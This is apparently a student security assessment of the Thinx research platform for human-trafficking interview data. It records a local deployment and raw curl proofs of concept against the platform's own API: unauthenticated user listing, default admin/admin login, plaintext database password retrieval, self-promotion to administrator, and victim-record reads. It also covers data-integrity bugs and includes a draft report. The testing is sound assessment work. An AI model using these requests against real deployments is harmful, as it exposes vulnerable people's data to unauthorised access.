# Thinx – Assignment 3: Deployment & Security Assessment

**Author:** Emre Ulusoy
**Date:** 21 September 2026
**Scope:** Original Thinx code (branch `Emre`, identical to upstream `main`, commit `0b4cd0d`)
**Deadline A3:** 22 September 2026, 19:00 (BrightSpace)

> **Handover note:** I am unavailable from 22 September. This document contains everything I did: how I deployed Thinx, every test with its raw output, the consolidated findings, and a draft of the A3 report. Please merge it with Ali's findings (`Thinx_Assessment_Findings.md`, referenced in `SECURITY_FIXES.md` but not yet pushed) into one group report.

---

## 1. Summary

I deployed the original Thinx application locally and tested it against its access control and trustworthiness. **Every critical weakness was confirmed with a working exploit.** Without logging in, anyone can list users, make themselves administrator, read the database password, read victim records, and run arbitrary queries on the database.

In addition, I found **data integrity problems that are not covered in Ali's `SECURITY_FIXES.md`**: trafficker names are split into single letters, all ages are lost, and nationality values are inconsistent. This means researchers cannot trust the analysis results, even when the application appears to work.

---

## 2. Deployment environment

| Item | Value |
|---|---|
| OS | Windows + WSL2 (Ubuntu) |
| Docker | Docker Desktop, Docker 29.8.0, Compose v5.5.1 |
| Branch / commit | `Emre` / `0b4cd0d` (= upstream `main`) |
| Profile | `no-ai` (without Ollama) |
| Local change | `shm_size: 8gb` → `2gb` in `docker-compose.yml` (memory only, no functional impact) |
| Test data | `Mock data/DT01.xlsx` |

### Steps to reproduce

```bash
git clone -b Emre https://github.com/amomen9/Thinx.git ~/thinx
cd ~/thinx
sed -i 's/shm_size: 8gb/shm_size: 2gb/' docker-compose.yml
docker compose --profile no-ai up -d --build
docker compose ps
curl -s http://localhost:5000/api/health
```

Then in the browser (`http://localhost:8080`):

1. Log in with `admin / admin`.
2. Add connection: host `allegrograph`, port `10035`, repository `humantrafficking`, user `admin`, password **`admin1233`**.
3. Data Workflow: Step 1 select connection → Step 2 upload `DT01.xlsx` → Step 4 Process & Clean Data → Step 5 Push to AllegroGraph.
4. Result: 100 victims, 800 incidents, 90 locations, 4,725 triples.

Deployment output:

```
NAME        IMAGE                    STATUS                             PORTS
agraph_db   franzinc/agraph:v8.0.1   Up 19 seconds (health: starting)   0.0.0.0:10035->10035/tcp
flask_api   thinx-backend            Up 20 seconds (healthy)            0.0.0.0:5000->5000/tcp
vue_ui      thinx-frontend           Up 20 seconds                      0.0.0.0:8080->80/tcp

{"service": "flask_api", "status": "healthy"}
Frontend: HTTP 200
```

---

## 3. Findings overview

| # | Finding | Category | Severity | Evidence |
|---|---|---|---|---|
| F1 | No authentication on any API endpoint | Access control | Critical | T1, T3, T5, T6, T7 |
| F2 | Privilege escalation: any user can make themselves admin | Access control | Critical | T4b, T4c |
| F3 | Default `admin/admin` account | Authentication | Critical | T2 |
| F4 | Database password returned in plain text by the API | Credentials | Critical | T3 |
| F5 | Victim records readable without login | Privacy / GDPR | Critical | T6 |
| F6 | Arbitrary SPARQL queries without login | Access control | High | T5, T8 |
| F7 | Open self-registration | Access control | High | T4a |
| F8 | All services exposed on all network interfaces | Deployment | High | `docker compose ps` |
| F9 | Trafficker names split into single letters | Data integrity | High | T8 + code |
| F10 | Personal data written to logs | Privacy / GDPR | Medium | T9 |
| F11 | Wrong DB credentials fail silently | Trustworthiness | Medium | T0 |
| F12 | Age field lost in the pipeline | Data integrity | Medium | T6 |
| F13 | Inconsistent nationality values | Data quality | Low | T6 |
| F14 | Conflicting DB passwords in configuration (`admin1233` / `admin123`) | Configuration | Low | T0 |
| F15 | Non-persistent `example.org` URIs and sequential victim IDs | FAIR / privacy | Low | T6 |

---

## 4. Evidence (raw outputs)

All tests were run **without any login, session or token**, from a terminal on the host machine.

### T0 – Wrong credentials fail silently (F11, F14)

The connection was first saved with password `admin123`. The Data Viewer showed **0 victims, 0 incidents, 0 triples** and no error. Testing the database directly:

```
$ curl -u admin:admin123  http://localhost:10035/repositories   → HTTP 401 Invalid username/password
$ curl -u admin:admin1233 http://localhost:10035/repositories   → HTTP 200
```

Meanwhile the backend log reported success:

```
[AllegroGraph] Repository 'humantrafficking' already verified, skipping check
[AllegroGraph] Successfully connected to 'humantrafficking'
[Data] Sample victim data: []
```

The connection is verified only once and then cached, so an authentication failure is shown to the user as "no data" instead of an error.

### T1 – User list without login (F1)

```
$ curl http://localhost:5000/api/admin/users
{
  "success": true,
  "users": [{
      "id": "05a68f89-aa04-452d-a345-60175350f3d6",
      "is_admin": true,
      "username": "admin", ...
  }]
}
HTTP 200
```

### T2 – Default admin account (F3)

```
$ curl -X POST -d '{"username":"admin","password":"admin"}' http://localhost:5000/api/login
{"message": "Login successful", "success": true, "user": {"is_admin": true, "username": "admin", ...}}
```

### T3 – Database password in plain text (F1, F4)

```
$ curl http://localhost:5000/api/connections
{
  "connections": [{
      "host": "allegrograph",
      "name": "Local Test",
      "password": "admin123",
      "port": 10035,
      "repository": "humantrafficking",
      "username": "admin", ...
  }]
}
```

After correcting the password in the UI, the same request returned `"password": "admin1233"`.

### T4 – Registration and privilege escalation (F2, F7)

```
# T4a – anyone can register
$ curl -X POST -d '{"username":"attacker","password":"attacker123"}' http://localhost:5000/api/register
{"message": "User registered successfully", "user": {"id": "d6854335-...", "is_admin": false, "username": "attacker"}}

# T4b – unauthenticated request makes the attacker admin
$ curl -X PUT -d '{"is_admin": true}' http://localhost:5000/api/admin/users/d6854335-cf87-464e-81be-c58ffb8bee4a
{"message": "User updated successfully", "user": {"is_admin": true, "username": "attacker"}}

# T4c – confirmation
$ curl -X POST -d '{"username":"attacker","password":"attacker123"}' http://localhost:5000/api/login
{"message": "Login successful", "user": {"is_admin": true, "username": "attacker"}}
```

### T5 – Arbitrary SPARQL without login (F1, F6)

```
$ curl -X POST -d '{"query":"SELECT (COUNT(*) AS ?triples) WHERE { ?s ?p ?o }"}' http://localhost:5000/api/query
{"results": [{"triples": "\"0\"^^xsd:integer"}], "success": true}
```

(Before data upload; after upload the repository contained 4,725 triples.)

### T6 – Victim records without login (F1, F5, F12, F13, F15)

```
$ curl "http://localhost:5000/api/data?limit=3"
{
  "data": [
    {"age": null, "gender": "Female", "nationality": "Ethiopian", "victim": "<http://example.org/resource/Victim/99>"},
    {"age": null, "gender": "Male",   "nationality": "Libyan",    "victim": "<http://example.org/resource/Victim/98>"},
    {"age": null, "gender": "Other",  "nationality": "Somalia",   "victim": "<http://example.org/resource/Victim/97>"}
  ],
  "success": true
}
```

- Victim data is readable by anyone (F5).
- `age` is `null` for every record (F12).
- Nationality mixes demonyms and country names: "Ethiopian", "Libyan" vs "Somalia" (F13).
- Victim IDs are sequential and easy to enumerate; URIs use `example.org` (F15).

### T7 – Statistics without login (F1)

```
$ curl http://localhost:5000/api/statistics
{"statistics": {"total_incidents": 800, "total_locations": 90, "total_triples": 4725, "total_victims": 100}, "success": true}
```

### T8 – Trafficker names split into letters (F6, F9)

```
$ curl -X POST -d '{"query":"SELECT DISTINCT ?s WHERE { ?s ?p ?o FILTER(CONTAINS(STR(?s), \"Trafficker\")) } LIMIT 5"}' http://localhost:5000/api/query
{"results": [
  {"s": "<http://example.org/hds#Trafficker>"},
  {"s": "<http://example.org/resource/Trafficker/_>"},
  {"s": "<http://example.org/resource/Trafficker/a>"},
  {"s": "<http://example.org/resource/Trafficker/d>"},
  {"s": "<http://example.org/resource/Trafficker/n>"}
]}
```

**Root cause** – `push_to_allegrograph.py`, line 77:

```python
for trafficker_name in victim.get("trafficker_name", []):
    trafficker_uri = URIRef(f"http://example.org/resource/Trafficker/{sanitize_uri(trafficker_name)}")
```

The code expects a list of names. When `trafficker_name` is a single string, Python iterates over its characters, and every letter becomes a separate "trafficker" with its own incident. Consequences:

- **Integrity:** Victim–trafficker links are wrong; the incident count (800) is likely inflated. Any analysis about traffickers is unreliable.
- **Privacy by design:** If the list were correct, real trafficker names would be written directly into URIs.

### T9 – Personal data in logs (F10)

```
$ docker compose logs backend | grep "First result"
flask_api | [Data] First result: {'victim': '<http://example.org/resource/Victim/99>', 'age': None,
            'gender': '"Female"^^xsd:string', 'nationality': '"Ethiopian"^^xsd:string'}
```

### Deployment exposure (F8)

`docker compose ps` shows `0.0.0.0:10035`, `0.0.0.0:5000`, `0.0.0.0:8080`: the database, API and frontend are reachable from the whole network, not only from the local machine.

---

## 5. Relation to Ali's `SECURITY_FIXES.md`

| Finding | Covered in Ali's branch? |
|---|---|
| F1–F8 (auth, admin, credentials, exposure) | Yes, fixes implemented (to be verified by re-running T1–T9 on branch `Ali`) |
| F10 (personal data in logs) | Partially (logging mentioned under M1) |
| F9, F12, F13 (data integrity) | **No – new findings** |
| F11 (silent credential failure) | Not mentioned |
| F15 (URIs / IDs) | Not mentioned |

**Suggested next step for the group:** re-run tests T1–T9 on branch `Ali` and record the new responses (expected 401/403). This gives a clear before/after comparison for the report and the technical plan.

---

## 6. Draft A3 report (~800 words)

> Word count requirement is unclear in the course outline (~800 vs 2000 ± 200). Confirm with the TAs; this draft targets ~800 and can be extended with Ali's findings.

### Thinx: Weaknesses in Access Control and Trustworthiness

**1. Introduction**

Thinx is a research platform that allows social scientists without programming skills to analyse interview data from victims of human trafficking. Data is uploaded as spreadsheets, cleaned, converted to RDF using the Humanitarian Data Space Common Data Model, stored in an AllegroGraph triple store, and explored through a dashboard and SPARQL queries. Because the data concerns highly vulnerable people, the platform must guarantee that only authorised researchers can access it, and that the results it presents are correct. This report assesses how well the current version meets these requirements.

**2. Method**

We deployed the original application (upstream `main`, commit `0b4cd0d`) with Docker Compose on a local machine, without the optional AI component. We loaded the provided mock interview dataset through the application's own workflow, resulting in 100 victims, 800 incidents and 4,725 triples. We then tested the application from the perspective of an unauthenticated outsider using direct HTTP requests to the backend API, inspected the stored data through SPARQL, and reviewed the backend logs and source code to find root causes.

**3. Access control**

The most serious weakness is that the backend does not enforce authentication at all. The login page only stores the user in the browser; the API itself never checks who sends a request. Without logging in, we could list all user accounts, read stored database connections including the database password in plain text, retrieve victim records, and execute arbitrary SPARQL queries against the triple store.

Authorisation is equally absent. Anyone can register an account, and with a single unauthenticated request we changed a newly created account from a normal user into an administrator. The application also creates a default `admin/admin` account on first start. Finally, the database, API and frontend are exposed on all network interfaces, so the database can be reached directly from outside the application.

Together, these weaknesses mean that any person who can reach the server has full control over the platform and its data.

**4. Trustworthiness and data integrity**

Trustworthiness also depends on whether researchers can rely on the results. Here we found several problems. First, trafficker names are split into single letters during RDF generation: the transformation script expects a list of names but receives a single string, so each character becomes a separate "trafficker" linked to many victims. As a result, every analysis involving traffickers, and likely the total incident count, is incorrect. Second, the age of every victim is lost during processing and stored as empty. Third, nationality values are inconsistent, mixing demonyms ("Ethiopian") with country names ("Somalia"), which distorts aggregations.

The application also hides errors from the user. When the database password in a connection was wrong, the backend logged a successful connection and the dashboard displayed zero records instead of an error. A researcher would conclude that the dataset is empty rather than that the connection is broken.

**5. Privacy and GDPR**

Victim records, including gender and nationality, are available without authentication, and the same data is written in plain text to the backend logs. Victim identifiers are sequential, which makes enumeration trivial, and URIs use the non-persistent `example.org` namespace, which also conflicts with the FAIR principle of persistent identifiers. By design, trafficker names would be embedded directly in resource URIs, which violates data minimisation and pseudonymisation principles.

**6. Conclusion and next steps**

Thinx currently offers no effective access control and produces analysis results that cannot be trusted. Several security issues have already been addressed in our team branch (session-based authentication, admin checks, removal of default credentials, credential redaction and network hardening); these fixes will be verified by repeating our tests. The data integrity problems identified here are not yet addressed. In our technical plan we will prioritise: (1) verifying and completing authentication and role-based authorisation, (2) correcting the RDF transformation for traffickers, ages and nationalities with automated tests, (3) pseudonymisation of identifiers and removal of personal data from logs, and (4) persistent identifiers aligned with the shared Common Data Model.

---

## 7. Open points for the group

- [ ] Confirm the word count (800 vs 2000) with the TAs.
- [ ] Confirm whether interviews are expected for A3 (the title mentions them; the outline schedules user contact in mid-October).
- [ ] Ali: push `Thinx_Assessment_Findings.md` and merge it with this document.
- [ ] Re-run tests T1–T9 on branch `Ali` for the before/after comparison.
- [ ] Add screenshots (UI with 0 vs 100 victims, admin/admin login) to the final report.
- [ ] Upload the final report to BrightSpace before **22 September, 19:00**.
